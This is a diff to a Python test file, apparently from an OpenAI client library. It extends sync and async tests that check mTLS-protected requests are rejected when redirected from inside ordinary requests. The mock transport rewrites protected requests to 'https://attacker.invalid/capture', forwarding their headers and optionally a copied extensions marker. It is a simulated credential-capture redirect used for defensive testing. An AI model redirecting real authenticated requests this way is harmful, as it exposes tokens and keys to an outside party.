@@ -1470,8 +1470,9 @@ async def test_async_x509_rejects_auxiliary_requests_with_another_active_identit
     ("ordinary_origin", "ordinary_api_key"),
     [("https://nested.example/v1", "nested-api-key"), ("https://attacker.invalid/v1", "access-token")],
 )
+@pytest.mark.parametrize("copy_ordinary_marker", [False, True])
 def test_sync_x509_rejects_redirected_protected_requests_nested_inside_ordinary_requests(
-    ordinary_origin: str, ordinary_api_key: str
+    ordinary_origin: str, ordinary_api_key: str, copy_ordinary_marker: bool
 ) -> None:
     requests: list[httpx2.Request] = []
     ordinary_host = httpx2.URL(ordinary_origin).host
@@ -1481,6 +1482,7 @@ def test_sync_x509_rejects_redirected_protected_requests_nested_inside_ordinary_
             self.depth = 0
             self.ordinary: OpenAI | None = None
             self.protected: OpenAI | None = None
+            self.ordinary_extensions: dict[str, Any] = {}
             super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
 
         @override
@@ -1490,10 +1492,14 @@ def test_sync_x509_rejects_redirected_protected_requests_nested_inside_ordinary_
                 self.ordinary.models.list()
             elif request.url.host == ordinary_host and self.depth == 1 and self.protected is not None:
                 self.depth = 2
+                self.ordinary_extensions = dict(request.extensions)
                 self.protected.models.list()
             elif request.url.host == "mtls.api.openai.com" and self.depth == 2:
                 request = httpx2.Request(
-                    request.method, "https://attacker.invalid/capture", headers=dict(request.headers)
+                    request.method,
+                    "https://attacker.invalid/capture",
+                    headers=dict(request.headers),
+                    extensions=self.ordinary_extensions if copy_ordinary_marker else None,
                 )
                 request.headers["host"] = "attacker.invalid"
             return super().send(request, **kwargs)
@@ -1515,8 +1521,9 @@ def test_sync_x509_rejects_redirected_protected_requests_nested_inside_ordinary_
     ("ordinary_origin", "ordinary_api_key"),
     [("https://nested.example/v1", "nested-api-key"), ("https://attacker.invalid/v1", "access-token")],
 )
+@pytest.mark.parametrize("copy_ordinary_marker", [False, True])
 async def test_async_x509_rejects_redirected_protected_requests_nested_inside_ordinary_requests(
-    ordinary_origin: str, ordinary_api_key: str
+    ordinary_origin: str, ordinary_api_key: str, copy_ordinary_marker: bool
 ) -> None:
     requests: list[httpx2.Request] = []
     ordinary_host = httpx2.URL(ordinary_origin).host
@@ -1526,6 +1533,7 @@ async def test_async_x509_rejects_redirected_protected_requests_nested_inside_or
             self.depth = 0
             self.ordinary: AsyncOpenAI | None = None
             self.protected: AsyncOpenAI | None = None
+            self.ordinary_extensions: dict[str, Any] = {}
             super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
 
         @override
@@ -1535,10 +1543,14 @@ async def test_async_x509_rejects_redirected_protected_requests_nested_inside_or
                 await self.ordinary.models.list()
             elif request.url.host == ordinary_host and self.depth == 1 and self.protected is not None:
                 self.depth = 2
+                self.ordinary_extensions = dict(request.extensions)
                 await self.protected.models.list()
             elif request.url.host == "mtls.api.openai.com" and self.depth == 2:
                 request = httpx2.Request(
-                    request.method, "https://attacker.invalid/capture", headers=dict(request.headers)
+                    request.method,
+                    "https://attacker.invalid/capture",
+                    headers=dict(request.headers),
+                    extensions=self.ordinary_extensions if copy_ordinary_marker else None,
                 )
                 request.headers["host"] = "attacker.invalid"
             return await super().send(request, **kwargs)
